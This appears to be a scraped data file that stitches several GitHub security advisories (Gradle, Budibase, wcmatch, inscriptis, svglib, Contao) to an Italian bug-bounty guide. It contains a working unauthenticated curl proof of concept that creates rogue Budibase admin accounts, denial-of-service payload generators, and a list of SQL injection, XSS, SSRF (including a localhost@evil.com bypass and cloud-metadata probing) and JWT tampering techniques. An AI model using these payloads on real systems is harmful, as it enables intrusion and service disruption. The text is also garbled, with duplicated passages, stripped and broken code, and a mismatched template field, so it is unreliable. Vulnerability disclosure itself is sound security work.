If you are using strict [repository content filtering](https://docs.gradle.org/9.3.0/userguide/filtering_repository_content.html#header) and / or [dependency verification](https://docs.gradle.org/9.3.0/userguide/dependency_verification.html), your build is safe from the potential vulnerabilities described above.

If you cannot update to a newer Gradle version, configuring [dependency verification](https://docs.gradle.org/9.3.0/userguide/dependency_verification.html) is the best way to make sure your build resolves the dependencies you expect and nothing else.

titolo: GHSA-w78c-w6vf-rw82: Gradle causes Failure to disable repositories can expose builds to malicious artifacts
descrizione:
### Impact

When resolving dependencies, Gradle searches repositories in declaration order. If it encounters connection errors, Gradle will disable the repository and fail dependency resolution. This is necessary for both reproducibility and security reasons to prevent dependencies from being resolved from other repositories without warning. 

In previous versions of Gradle, some exceptions were not treated as fatal errors and would not cause a repository to be disabled. If a build encountered one of these exceptions, Gradle would continue to the next repository in the list and potentially resolve dependencies from a different repository. 

#### Vulnerability caused by unresolvable host names

[`UnknownHostException`](https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/net/UnknownHostException.html) are caused when a host name cannot be resolved to an IP address. This can be caused by DNS misconfiguration, host name typos or any problem that prevents host name resolution. 

If a Gradle build used an unresolvable host name, Gradle would continue to work as long as all dependencies could be resolved from another repository. An unresolvable host name could be caused by allowing a repository's domain name registration to lapse or typo-ing the real domain name. 

This behavior could allow an attacker to register a service under the host name used by the build and serve malicious artifacts. The attack requires the repository to be listed before others in the build configuration. 

### Patches

Gradle has introduced a change in behavior in Gradle 9.3.0 and 8.14.4 to stop searching other repositories when encountering these errors. 

Upgrading to either version will protect you against the vulnerabilities described here.

### Workarounds

If you are using strict [repository content filtering](https://docs.gradle.org/9.3.0/userguide/filtering_repository_content.html#header) and / or [dependency verification](https://docs.gradle.org/9.3.0/userguide/dependency_verification.html), your build is safe from the potential vulnerabilities described above.

If you cannot update to a newer Gradle version, configuring [dependency verification](https://docs.gradle.org/9.3.0/userguide/dependency_verification.html) is the best way to make sure your build resolves the dependencies you expect and nothing else.

You should also review which repositories your builds use to check for unused or outdated repository declarations. 

### Related
* [Security feature of failing fast on bad repos does not seem to be implemented](https://github.com/gradle/gradle/issues/35927)
* [Repository disabling](https://docs.gradle.org/current/userguide/graph_resolution.html#sec:repository-disabling)
* [Advisory about repositories failing to answer](https://github.com/gradle/gradle/security/advisories/GHSA-mqwm-5m85-gmcv)

titolo: GHSA-25qc-m4pw-2w8r: Budibase: Unauthenticated global-admin & database creation via tenant-confusion bypass of the one-time init guard (`POST /api/global/users/init`)
descrizione:
## Description

### Summary

On a self-hosted, single-tenant Budibase instance (`multiTenancy:false`), the public bootstrap endpoint `POST /api/global/users/init` remains fully exploitable **after** the instance has been provisioned. Its "already initialised" guard (`checkAnyUserExists()`) is evaluated inside a **tenant-scoped** database context derived from an **attacker-controlled `tenantId`** in the request body. Because the tenancy layer never constrains that `tenantId` to the only legitimate tenant (`default`) on a single-tenant deployment, an unauthenticated attacker simply supplies any unused tenant name to make the guard see an empty user list, and the endpoint then creates a brand-new CouchDB database (`<tenantId>_global-db`) and a **global-admin** user document (`admin.global = true`, `builder.global = true`) inside it - with no authentication and no CSRF token.

This is (a) a bypass of the security control meant to permanently close first-run setup, and (b) an unauthenticated, persistent write primitive that lets an anonymous attacker create an unbounded number of databases and admin-user documents - a resource-exhaustion / denial-of-service vector against the CouchDB datastore, plus creation of latent rogue admin accounts.

### Details

Root cause chain (source, tag v3.44.0):

1. `packages/worker/src/api/index.ts:41` - `POST /api/global/users/init` is in `PUBLIC_ENDPOINTS`, so `auth.buildAuthMiddleware(PUBLIC_ENDPOINTS)` marks it `publicEndpoint` and the "no public access to worker" gate (`api/index.ts:159-165`) lets it through **without any session**. It is also in `NO_TENANCY_ENDPOINTS` (`api/index.ts:83`), so the tenancy middleware does **not** pin the request to `default` - the tenant is taken verbatim from the request body - and in `NO_CSRF_ENDPOINTS`.
2. `packages/worker/src/middleware/cloudRestricted.ts:10,25` - the `cloudRestricted` guard only enforces the internal API key when `!env.SELF_HOSTED && !env.DISABLE_ACCOUNT_PORTAL`. On a self-hosted instance (`SELF_HOSTED=true`) it is a **no-op** (`return next()`), so `cloudRestrictedRoutes` provides no protection here.
3. `packages/worker/src/api/routes/global/users.ts:69-79` - `cloudRestrictedRoutes.post("/api/global/users/init", … controller.adminUser)`.
4. `packages/worker/src/api/controllers/global/users.ts:232` - the handler runs `await tenancy.doInTenant(tenantId, …)` using the **attacker-supplied** `tenantId`.
5. `packages/worker/src/api/controllers/global/users.ts:238` - the only guard, `const userExists = await checkAnyUserExists()`, throws 403 only if a user exists **in the current tenant context**.
6. `packages/worker/src/utilities/users.ts:3-15` - `checkAnyUserExists()` calls `tenancy.getGlobalDB()`, which resolves to `<tenantId>_global-db`. For any unused `tenantId` this DB is empty → the guard passes → `userSdk.db.createAdminUser(email, tenantId, …)` (`users.ts:247`) creates a full global admin.

The defect is **incorrect authorization scoping**: the single-tenant deployment invariant ("only tenant `default` exists; init is one-time") is never enforced against the request-supplied `tenantId`, so the guard is evaluated against a namespace the attacker chooses.

Configuration confirmed via `GET /api/system/environment` → `{"multiTenancy":false,"cloud":false,"disableAccountPortal":false,"isDev":false}`.

### PoC

Target `http://127.0.0.1:3014` (Budibase `v3.44.0-cloud.2`). **No credentials, no cookies, no CSRF token.** All values real, captured live on 2026-09-02; nothing redacted.

---

#### Step 1 - BASELINE: the guard correctly blocks re-init of the real tenant (`default`)

```bash
curl -s -i -X POST 'http://127.0.0.1:3014/api/global/users/init' \
  -H 'Content-Type: application/json' \
  -d '{"email":"pwn-default@evil.test","password":"Pwned!2026#bb","tenantId":"default"}'
```

**Burp - Request**

```http
POST /api/global/users/init HTTP/1.1
Host: 127.0.0.1:3014
Content-Type: application/json
Content-Length: 82

{"email":"pwn-default@evil.test","password":"Pwned!2026#bb","tenantId":"default"}
```

**Burp - Response**

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8

{"message":"You cannot initialise once an global user has been created.","status":403}
```

---

#### Step 2 - PAYLOAD: supply any unused `tenantId` → the guard is bypassed and a global admin is created, fully unauthenticated

```bash
curl -s -i -X POST 'http://127.0.0.1:3014/api/global/users/init' \
  -H 'Content-Type: application/json' \
  -d '{"email":"pwn-f7poc@evil.test","password":"Pwned!2026#bb","tenantId":"f7poc"}'
```

**Burp - Request**

```http
POST /api/global/users/init HTTP/1.1
Host: 127.0.0.1:3014
Content-Type: application/json
Content-Length: 78

{"email":"pwn-f7poc@evil.test","password":"Pwned!2026#bb","tenantId":"f7poc"}
```

**Burp - Response**

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"_id":"us_d0c2b6c9014a43e2899a2770d2e6280c","_rev":"1-554ff75f0064fb15f92e341faad7263b","email":"pwn-f7poc@evil.test"}
```

The single differential - `tenantId:"default"` → 403, `tenantId:"f7poc"` → 200 with a persisted `us_…` id - is the whole bug: the one-time-setup guard is scoped to a namespace the attacker chooses.

---

#### Step 3 - the write persisted: re-init of the same tenant now hits the (per-tenant) guard

```bash
curl -s -i -X POST 'http://127.0.0.1:3014/api/global/users/init' \
  -H 'Content-Type: application/json' \
  -d '{"email":"pwn-f7pocb@evil.test","password":"Pwned!2026#bb","tenantId":"f7poc"}'
```

**Burp - Response**

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8

{"message":"You cannot initialise once an global user has been created.","status":403}
```

Each unique `tenantId` is a fresh write primitive - an attacker loops `tenantId=a0001,a0002,…` to create unbounded databases + admin docs (DoS).

---

#### Step 4 & 5 - datastore side-effect: a new `<tenant>_global-db` and a real global-admin document

Read directly from CouchDB inside the container (`$COUCH_DB_URL` = `http://admin:…@127.0.0.1:5984`):

```
GET /_all_dbs =>
[
 "app_cc322a9cd27a492eb934f43b146c6e81",
 "app_dev_cc322a9cd27a492eb934f43b146c6e81",
 "f7poc_global-db",     <-- created by the unauthenticated init call (tenantId=f7poc)
 "global-db"            <-- legitimate default-tenant global DB
]

rogue DB 'f7poc_global-db' present: True
```

The document created in `f7poc_global-db` is a full global admin:

```json
{
  "_id": "us_d0c2b6c9014a43e2899a2770d2e6280c",
  "email": "pwn-f7poc@evil.test",
  "admin":   { "global": true },
  "builder": { "global": true },
  "tenantId": "default",
  "roles": {}
}
```

---

#### Step 6 - ceiling check (honest): the injected admin cannot log in while multi-tenancy is off

```bash
curl -s -i -X POST 'http://127.0.0.1:3014/api/global/auth/f7poc/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"pwn-f7poc@evil.test","password":"Pwned!2026#bb"}'
```

**Burp - Response**

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8

{"message":"Invalid credentials","status":403}
```

With `multiTenancy:false` the login flow forces the `default` tenant, so the injected admin is **not** usable to log into the running default-tenant instance. The provable impact is therefore control-bypass + unauthenticated persistent datastore writes / DoS + creation of rogue admin accounts that become active if multi-tenancy is later enabled or during tenant-iterating operations (restore/migration).

### Impact

**Type:** Missing/incorrect authorization on a critical function - **unauthenticated bypass of the one-time initialization guard**, yielding anonymous global-admin-document and database creation.

**Who is impacted:** every self-hosted single-tenant Budibase instance exposing the worker API (via the front nginx). Any unauthenticated network attacker can:
- **defeat the first-run setup lock** that is supposed to be permanently closed after provisioning;
- **create global-admin user documents** in attacker-named tenants with no credentials (latent rogue admins that activate if multi-tenancy is enabled or during migration/restore);
- **create an unbounded number of CouchDB databases** (`<rand>_global-db`) and documents - a resource-exhaustion / DoS vector against the datastore (disk, inodes, file descriptors, the `_dbs` metadata shard).

titolo: GHSA-r2q3-7m4h-63qg: Budibase: Cross-privilege Stored XSS in the Budibase Builder via broken HTML-escaping in `jsonFormatter.format()` rendered through `{@html}` in the CSP-less Builder origin
descrizione: ## Description ### Summary A **low-privileged application end-user** (role `BASIC` - **not** a builder or admin, and on a public data-collection form, an unauthenticated visitor) can store an HTML/JavaScript payload in ordinary row data. When a **builder or admin** later opens that table in the Budibase Builder and evaluates any Handlebars binding whose Preview surfaces the value (the Data-section **Formula** column editor, or any binding drawer), the stored value is rendered as **raw HTML** and the attacker's JavaScript executes in the Builder's origin. The Builder SPA is served by nginx with **no Content-Security-Policy** (the CSP middleware only decorates the server-rendered *published-app* document, not `/builder/`). The injected script therefore runs unrestricted in the highest-trust surface of the product - the admin/builder session that can create datasources, run server-side JavaScript via automations, read and modify every table, and manage users. This is a **cross-privilege stored XSS** (app end-user → builder/admin), i.e. full workspace takeover, not self-XSS. ### Details **Root cause 1 - the escaper is a no-op.** `packages/frontend-core/src/utils/jsonFormatter.ts` (`format()`): ```js jsonString = jsonString .replace(/&/g, "&") // no-op: replaces "&" with "&" (should be "&") .replace(//g, ">") // no-op (should be ">") return jsonString.replace( /("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+...)/g, (match) => { if (/^"/.test(match)) { if (/:$/.test(match)) { color = colors.keyColor } // KEY: NOT escaped else { match = '"' + escapeHtml(match.substr(1, match.length - 2)) + '"' } // string VALUE: escaped } return `${match}` }) ``` Only quoted JSON *string values* are passed through `escapeHtml`. Everything else is emitted verbatim, because the leading `.replace(/&/g,"&")…` chain replaces each character with itself. Two consequences: 1. A **raw, non-JSON string** (the normal result of a Handlebars binding that resolves to a plain text field value) matches none of the regex tokens and is returned **completely un-escaped**. 2. **Object keys** are never escaped. **Root cause 2 - the output is injected with `{@html}`.** `packages/builder/src/components/common/bindings/EvaluationSidePanel.svelte`: - line 116: `{@html logLine.log}` - line 128: `{@html highlightedResult}` `highlightedResult` is the output of `JsonFormatter.format()`, so the un-escaped attacker string is inserted into the DOM as live markup. **Root cause 3 - binding output is not entity-escaped upstream.** Every `{{ … }}` statement is wrapped by the `ALL` helper in `packages/string-templates/src/helpers/index.ts`, which returns a `Handlebars.SafeString`; Handlebars therefore performs no HTML escaping, and the raw field value reaches the formatter/`{@html}` sink. **Root cause 4 - no CSP on the Builder.** `GET /builder/*` is served as a static SPA by nginx with **no** `Content-Security-Policy` header (verified live below). The `contentSecurityPolicy` middleware (`packages/backend-core/src/middleware/contentSecurityPolicy.ts`) only sets a nonce-based CSP on the server-rendered *published-app* document (`serveApp`). So in the Builder origin there is no `script-src` restriction and inline event handlers run freely. **Cross-privilege data channel.** Internal-table dev/prod data live in separate databases, but **external datasources are queried live and shared** between the published app (where low-priv users write) and the Builder's dev preview (where the value is rendered). A `BASIC` app user writing to an external SQL table that a data-collection app exposes for writes therefore lands the payload directly in the Builder's evaluation context. `RowUtils.generateGoldenSample()` even *prefers the longest string per column*, guaranteeing a long payload is the sample the Preview evaluates. **Payload shape note.** `jsonFormatter.format()` tokenises quoted strings, digits and `true/false/null` into ``s, which would fragment a handler containing them. titolo: GHSA-53pm-wgxf-c6qf: wcmatch: Polynomial-time ReDoS when matching untrusted names against multi-star patterns (default flags)
descrizione:
# Summary

With default flags, a pattern that contains several `*` wildcards takes polynomial time, O(n^k) for k stars, to reject a crafted file name. The pattern is an ordinary developer constant such as `*_*_*_*_*.csv`; only the string being matched comes from the attacker. A 255-byte file name (the maximum on common filesystems) takes 73 s with `fnmatch.fnmatch()` and 86 s with `glob.globmatch()`. The standard library's `fnmatch` handles the same input in under a millisecond.

This is different from GHSA-84v8-qmgq-9g88: that advisory covers extglob patterns, while this case needs no flags and no attacker-controlled pattern.

# Details

Every `*` is translated to a lazy `.*?` (`_STAR`, `wcmatch/_wcparse.py:212`; `_PATH_STAR` `[^/]*?`, `:218`), which is emitted in `_handle_star` (`:1405-1424`):

```text
*_*_*_*_*.csv  ->  ^(?s:(?=.)(?![.]).*?_.*?_.*?_.*?_.*?\.csv)$
```

When the subject consists of many `_` and does not end in `.csv`, the regex engine tries every way of splitting it between the stars. CPython fixed the same problem in its own `fnmatch` (bpo-40480) by making every star segment except the last one atomic.

# PoC

```python
import time, fnmatch as std
from wcmatch import fnmatch, glob

for pat, n in [('*_*_*_*.csv', 255), ('*_*_*_*.csv', 400), ('*_*_*_*_*.csv', 150),
               ('*_*_*_*_*.csv', 200), ('*_*_*_*_*.csv', 255)]:
    name = '_' * n
    t = time.perf_counter(); fnmatch.fnmatch(name, pat); w = time.perf_counter() - t
    t = time.perf_counter(); std.fnmatchcase(name, pat); s = time.perf_counter() - t
    print(f'{pat:15} len={n}  wcmatch={w:.3f}s  stdlib={s:.5f}s')

t = time.perf_counter(); glob.globmatch('uploads/' + '_' * 255, 'uploads/*_*_*_*_*.csv')
print(f'globmatch {time.perf_counter() - t:.2f}s')
```

wcmatch 11.1, CPython 3.13, macOS:

```text
*_*_*_*.csv     len=255  wcmatch=1.412s   stdlib=0.00001s
*_*_*_*.csv     len=400  wcmatch=8.599s   stdlib=0.00004s
*_*_*_*_*.csv   len=150  wcmatch=5.333s   stdlib=0.00003s
*_*_*_*_*.csv   len=200  wcmatch=22.415s  stdlib=0.00007s
*_*_*_*_*.csv   len=255  wcmatch=72.732s  stdlib=0.00047s
globmatch 85.75s
```

`glob.glob('*_*_*_*.csv', root_dir=d)` on a real directory that contains one file named `'_' * 255` takes 1.7 s.

# Impact

Applications that match untrusted names against multi-star patterns can be blocked on a single CPU core for minutes per name. Examples: upload handlers, archive or object-store key filters, and `glob`/`WcMatch` scans of directories where other users can create files. No authentication is needed.

# Fix

Emit every star segment except the last one as an atomic group, as the standard library does. On Python 3.11 and later use `(?>.*?_)`; on 3.10 use the lookahead/backreference form from `fnmatch._join_translated_parts`. For example:

```text
^(?s:(?=.)(?![.])(?>.*?_)(?>.*?_)(?>.*?_)(?>.*?_).*?\.csv)$
```

This rejects the 255-byte name in under 1 ms. On my spot-check inputs it gives the same results as the current regex. The same change applies to `_PATH_STAR`.

titolo: GHSA-q87h-c5m7-659j: Inscriptis: Quadratic memory growth from sibling <table> elements in get_text()
descrizione:
# Summary Every sibling `` adds another level of the parent's indentation, so the size of `get_text()` output grows quadratically with the number of tables. In the measurements below, a 240 KB HTML document produces about 1 billion characters and uses about 1 GB of memory. # Details `table_end_handler()` (`model/tag/table_tag.py`) writes the rendered table into the parent element with `HtmlElement.write_verbatim_text()` (`model/html_element.py`). For a block-level parent, `write_verbatim_text()` calls `canvas.open_block()`, which pushes the parent's `padding_inline` onto the prefix stack. The following `close_block()` never pops it; only `Canvas.close_tag()` calls `prefix.remove_last_prefix()`. So each table leaves one extra padding entry on the stack. This has been present since 2.0 (commit 84ec720). ```python >>> get_text('
    ' + '
a
' * 4 + '') ' a\n \n a\n \n a\n \n a\n ' ``` # PoC ```python import sys, time, resource from inscriptis import get_text n = int(sys.argv[1]) html = "
    " + "
    " * n + "
" t = time.time(); out = get_text(html) print(len(html), f"{time.time()-t:.2f}s", len(out), resource.getrusage(resource.RUSAGE_SELF).ru_maxrss // 2**20, "MiB") ``` inscriptis 2.7.5, Python 3.11, macOS (2.0.0 behaves the same): | tables | HTML | time | output chars | peak RSS | |---|---|---|---|---| | 1,000 | 15 KB | 0.02 s | 4.0 M | 31 MiB | | 4,000 | 60 KB | 0.33 s | 64 M | 154 MiB | | 8,000 | 120 KB | 1.31 s | 256 M | 463 MiB | | 16,000 | 240 KB | 5.63 s | 1,024 M | 991 MiB | When the input doubles, output size and memory grow about 4 times. # Impact Any application that converts untrusted HTML with inscriptis can be made to exhaust memory with a small document. titolo: GHSA-555j-qj3j-c8jv: svglib: Exponential resource consumption via nested <use> references in svg2rlg
descrizione: # Summary `svg2rlg()` expands `` references without any limit on the total number of expansions. Only direct cycles are rejected (`CircularRefError`). A group containing N `` elements that point to another such group multiplies the work by N per nesting level, so an SVG of about 1.4 KB makes svglib clone and render over 100,000 nodes, taking tens of seconds of CPU time and hundreds of MiB of memory. Each additional level adds about 245 bytes to the document and multiplies time by ~10. This is the SVG `` variant of the XML "billion laughs" attack (the same class as librsvg CVE-2019-20446). # Details `SvgRenderer.renderUse()` in `src/svglib/svglib.py`: ```python try: item = self.xlink_href_target(node, group=group) except CircularRefError: node.parent.etree_element.remove(node.etree_element) return group ... if len(node.getchildren()) == 0: # Append a copy of the referenced node as the child (if not # already done) node.append(copy.deepcopy(item)) self.renderNode(list(node.iter_children())[-1], parent=group) ``` The referenced node is deep-copied under the `` element and rendered. Any `` elements inside the copied subtree go through `renderUse()` again. `xlink_href_target()` raises `CircularRefError` only for a direct cycle, so a reference DAG with fan-out is expanded fully: `fan ** levels` renders. Payload shape (fan = 10, levels = 5): ```xml ``` # Impact Denial of service (CPU and memory exhaustion) for any application that renders SVG from an untrusted source with svglib: thumbnail/preview generation, SVG-to-PDF conversion, report generation. Only the SVG document needs to be attacker-controlled; no non-default option is required. The same happens through `xhtml2pdf`, which depends on svglib to render SVG images. An HTML document containing `` passed to `pisa.CreatePDF()` triggers the expansion. HTML-to-PDF conversion of user-supplied content is a common use of xhtml2pdf in web applications. # Reproduction Minimal local PoC, non-destructive: ```python import io, time from svglib.svglib import svg2rlg def make(levels, fan=10): parts = ['') return "".join(parts).encode() for levels in (3, 4, 5): data = make(levels) t = time.time() svg2rlg(io.BytesIO(data)) print(levels, len(data), f"{time.time() - t:.1f}s") ``` Result on svglib 2.3.0 (commit `5d28646`), Python 3.12, macOS: | levels | SVG size | time | peak RSS | |---|---|---|---| | 3 | 919 B | 0.3 s | 42 MiB | | 4 | 1164 B | 2.9 s | 83 MiB | | 5 | 1409 B | 34 s | 469 MiB | svglib 1.5.1 from PyPI behaves the same (levels = 4: 2.8 s, 82 MiB). Through xhtml2pdf 0.2.23 with the same SVG embedded as a `data:` URI ``: | levels | HTML size | time | peak RSS | |---|---|---|---| | 4 | 1626 B | 6.9 s | 133 MiB | | 5 | 1954 B | 78.7 s | 499 MiB | # Suggested fix Count `` expansions per document and stop expanding beyond a fixed limit: ```diff @@ src/svglib/svglib.py # A sentinel to identify a situation where a node reference a fragment not yet defined. DELAYED = object() +# Upper bound on the number of elements expanded while rendering one document. +# Nested references multiply (a few hundred bytes can expand to millions of +# nodes), so rendering stops expanding elements beyond this limit. +MAX_USE_EXPANSIONS = 10_000 + @@ class SvgRenderer: self._external_svgs: dict[str, ExternalSVG] = {} + self._use_expansions = 0 self.attrConverter.css_rules = CSSMatcher() @@ def renderUse( if group is None: group = Group() + self._use_expansions += 1 + if self._use_expansions > MAX_USE_EXPANSIONS: + if self._use_expansions == MAX_USE_EXPANSIONS + 1: + logger.error( + "Too many expansions (limit is %d), skipping the rest", + MAX_USE_EXPANSIONS, + ) + return group + try: item = self.xlink_href_target(node, group=group) ``` With the fix, a 6-level payload (1654 B, one million expansions without the limit) renders in 1.1 s with 64 MiB peak RSS. The limit value is a suggestion; 10,000 `` elements is far above what normal documents (icon sprites, symbol libraries) need. # Regression test A regression test `TestUseNode::test_use_nested_expansion_is_bounded` in `tests/test_basic.py` renders the 5-level payload and asserts it finishes within 10 seconds. * Without fix: test fails (30.9 s). * With fix: test passes (1.8 s). `python -m pytest tests/test_basic.py tests/test_units.py tests/test_external_references.py tests/test_fonts.py -q` → **190 passed, 4 skipped**. No regressions. I'm happy to share the full patch (including the test), for example as a PR on a temporary private fork of this advisory. # Affected versions `<= 2.3.0` (verified on 2.3.0 and 1.5.1)

titolo: GHSA-h57j-5f5m-789v: contao/core-bundle: Cross-site scripting in the frontend search results
descrizione:
Commit `23e8cca3136a` hardened the search-result title against insert-tag/XSS by setting `$objTemplate->title = StringUtil::specialchars(StringUtil::stripInsertTags($arrResult[$i]['title']))`. But the legacy HTML5 template does not use that `title` variable - it prints the raw `link` variable, which is assigned without escaping.

## Impact

Affected configuration (important): on 5.7.9 the default search template is the Twig `search_default.html.twig`, which does not use the raw `link` variable and auto-escapes - so a default Twig install is not affected. The vulnerable raw echo is in the legacy `search_default.html5` template (still shipped and selectable in 5.7.9, line 8: `<?= $this->link ?>`); exploitation requires that legacy template to be active for the search module (common on sites migrated from earlier Contao / using custom template selection). Where the legacy template is used, the sink is unambiguously raw and `ModuleSearch::compile()` assigns `link` from the entity-decoded indexed title.

A backend page editor can store script that executes for anonymous front-end visitors (and admins) viewing search results, a stored XSS crossing the editor -> anonymous-visitor boundary.

## Credits

This security vulnerability was found by @HDWSec

titolo: GHSA-r9qp-pqx5-8369: contao/core-bundle: Non-admin users can self-grant permissions that implicitly make them administrators
descrizione:
Commit `2b83a60f7763` (5.7.3) hardened the template editor: it added `TemplateEditorModuleVoter` + `CheckTemplateEditorSaveListener` so a non-admin cannot self-grant the `tpl_editor` backend module (editable PHP-capable templates permit server-side code execution). That voter supports only the `modules` field and the literal value `tpl_editor`.

The equally RCE-capable `theme_import` capability lives in a different field - the `themes` checkbox field (tl_user_group.php:98-105 options include `theme_import`; identical on tl_user.php:248-253) - which has no save_callback and no voter. `TemplateEditorModuleVoter` is the only DC voter registered for tl_user_group, and it does not cover the `themes` field. So a delegated user manager can add `theme_import` to their own (or a managed) account.

Live repro (Contao 5.7.9):
1. As admin, create a non-admin backend group with the `user` (or `group`) module (a delegated user manager), and a user in it. Confirm the user cannot access `tpl_editor` (blocked by the 5.7.3 voter).
2. As that non-admin, edit a group/account: add `themes` to the modules field and `theme_import` to the themes field (both accepted - only `tpl_editor` is blocked). Re-authenticate.

## Impact

A delegated user/group manager (a role explicitly not trusted with template/code access) escalates to arbitrary PHP execution on the server, fully compromising the installation. This bypasses the exact protection the 5.7.3 `tpl_editor` fix introduced.

## Credits

This security vulnerability was found by @HDWSec

titolo: GHSA-23w9-4pg3-xwm3: contao/core-bundle: Improper access control in the CSV import wizard
descrizione:
Custom backend module "key" actions are dispatched in `Backend::getBackendModule()` (Backend.php:322-327) after only the module-level `USER_CAN_ACCESS_MODULE` check - no per-record voter runs.

## Impact

A non-admin editor scoped to certain pages/forms can overwrite the tableitems/listitems/options of arbitrary tl_content / tl_form_field records outside their scope, defeating the per-record access control. Integrity IDOR (blind content overwrite; the value written is `serialize()` of a plain string array from the CSV - not object injection).

## Credits

This security vulnerability was found by @HDWSec

titolo: GHSA-3r9g-pfhv-3228: contao/newsletter-bundle: Contao newsletter custom actions bypass channel-scoped authorization
descrizione:
Channel access is enforced only by the DataContainer voters (`NewsletterChannelAccessVoter` / `NewsletterRecipientsAccessVoter`, requiring USER_CAN_EDIT_CHANNEL), whose `supportsType()` fires exclusively for Create/Read/Update/DeleteAction subjects dispatched inside DC_Table's create/edit/delete methods. The newsletter custom key-actions are dispatched directly by `Backend::getBackendModule()` (Backend.php:324-327) after only the module-level `USER_CAN_ACCESS_MODULE` check; the DC_Table constructor runs no per-record ReadAction vote for a key-action. `Newsletter.php` contains no `isGranted` / `denyAccess` / `isAdmin` / `hasAccess` calls, and none of the newsletter DCAs have a `checkPermission` onload callback.

## Impact

A channel-scoped newsletter editor can inject recipients into, mass-mail, and in some versions, delete/denylist recipients of channels they are not authorized to edit - defeating the per-channel permission model (integrity + abuse of the mail-sending capability).

## Credits

This security vulnerability was found by @HDWSec

titolo: GHSA-72jh-722p-rqr3: memtomem-stm: Concurrent LTM recovery can duplicate reconnects or reuse a cancelled transport session
descrizione: Concurrent surfacing RPC failures can trigger more than one reconnect for the same dirty session, and cancellation during a post-reconnect retry can leave the replacement session reusable despite an interrupted protocol exchange. The private fix introduces monotonic session generations, one shielded shared reconnect flight per dirty generation, and generation-aware cancellation handling across search, access-count, and scratch RPCs. The duplicate-reconnect subcase was introduced in 0.1.24; cancellation recovery affects the broader listed range.

titolo: GHSA-43hx-xm7w-3mhj: memtomem-stm: Surfaced memory data can escape the Markdown compatibility boundary
descrizione: Untrusted long-term and working-memory fields can introduce Markdown or HTML-compatible structure into the surfaced-memory envelope. A crafted memory may create misleading structural boundaries or visually conceal content. The private fix serializes every untrusted field as inert single-line data, validates copyable memory identifiers, and pins an explicit untrusted-data preamble. Ordinary natural-language persuasion remains a residual model-level risk.

steps: Identifica tutte le superfici di input/output
Mappa flusso dati end-to-end
Testa ogni input con fuzzing (boofuzz, radamsa)
Verifica configurazioni di default e credenziali
Documenta ogni anomalia con PoC riproducibile

reportingSteps: 1. REGISTRAZIONE: Crea un account sul programma e metti il tuo handle di test in bio
2. RACCOLTA PROVE: Cattura screenshot/video di OGNI step della riproduzione con timestamp
3. MINIMIZZAZIONE: Crea un account demo e un account vittima (no dati reali)
4. REDAZIONE REPORT: Segui il template del programma, includi: Summary, Impact, Steps to Reproduce, PoC, Remediation
5. IMPATTO BUSINESS: Spiega sempre "What can an attacker do?" non solo "How does it work"
6. CVSS SCORE: Calcola il punteggio CVSS v3.1 con cvss calculator
7. SUBMIT: Carica su HackerOne/Bugcrowd/Intigriti e attendi triage (24-72h)
8. DUPLICATI: Se è un dup, è normale. Continua a cacciare!
9. RETEST: Dopo il fix, verifica che la patch funzioni davvero
10. DISCLOSURE: Aspetta il permesso del programma prima di blog/tweet
quickStartGuide: Step 1: Leggi TUTTO il policy del programma su [remote] Exasol Database 7.1.30 - Command Execution
Step 2: Configura Burp Suite con il proxy del tuo browser (FoxyProxy)
Step 3: Crea due account: attaccante e vittima su due browser diversi
Step 4: Mappa tutte le feature: signup, login, profilo, pagamenti, API
Step 5: Inizia con OWASP Top 10 e tools automatici (nuclei, sqlmap)
Step 6: Testa manualmente la business logic (sconti, ruoli, workflow)
Step 7: Documenta OGNI cosa interessante
Step 8: Scrivi un report chiaro con PoC riproducibile in 5 minuti
Step 9: Submeti e rispondi velocemente a domande del triage
Step 10: Studia i report pubblici (HackerOne Hacktivity) per imparare
tips: 💡 Leggi almeno 50 report risolti su HackerOne Hacktivity prima di iniziare
💡 Concentrati su UN programma per almeno 2 settimane
💡 Le business logic bug pagano DI PIÙ delle XSS
💡 I bug race condition sono sottovalutati ma pagati
💡 Usa Wayback Machine (web.archive.org) per trovare endpoint dimenticati
💡 Controlla sempre le API mobile vs web
💡 Non riportare MAI self-XSS, clickjacking senza impatto
💡 Impara Burp a livello avanzato: macro, match/replace, scanner
💡 La qualità del report > quantità
💡 Network: Discord Bugcrowd, NahamSec, InsiderPhD, STÖK

steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

testingTechniques.name: Mass Assignment
